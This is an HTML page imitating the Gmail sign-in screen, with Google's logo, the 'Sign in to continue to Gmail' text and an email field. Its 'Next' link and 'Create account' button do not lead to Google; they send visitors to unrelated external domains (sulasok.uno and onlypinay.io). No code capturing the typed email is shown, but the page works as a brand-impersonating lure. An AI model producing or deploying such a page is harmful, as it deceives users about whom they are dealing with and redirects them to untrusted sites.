<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <link id="google" rel="icon" href="Google__G__logo.svg.png" />
    <link rel="stylesheet" href="main.css" />
</head>

<body>
    <div class="container">
        <div id="tagline">
            <img src="Google__G__logo.svg.png" alt="Google Logo" height="45" width="45" />
            <h1 id="sign-in">Sign in</h1>
            <p id="word">to continue to Gmail</p>
        </div>

        <div class="username">
            <input id="EMAIL" placeholder=" " type="email" required />
            <label for="EMAIL">Email or phone</label>
        </div>
        <a id="forgot-email" href="#">Forgot email?</a>

        <p id="guest-mode">Not your computer? Use Guest mode to sign in privately. <br> <a id="guest-mode-link" href="#"
                target="_blank">Learn more about using Guest mode</a></p>


        <a id="next-btn" href="https://sulasok.uno/">Next</a>
        <button id="create-acc-btn" onclick="window.location.href='https://onlypinay.io/'">Create account</button>

    </div>

    <footer>
        <select name="lang" id="language"></select>

        <nav>
            <button>Help</button>
            <button>Privacy</button>
            <button>Terms</button>
        </nav>
    </footer>
</body>

</html>
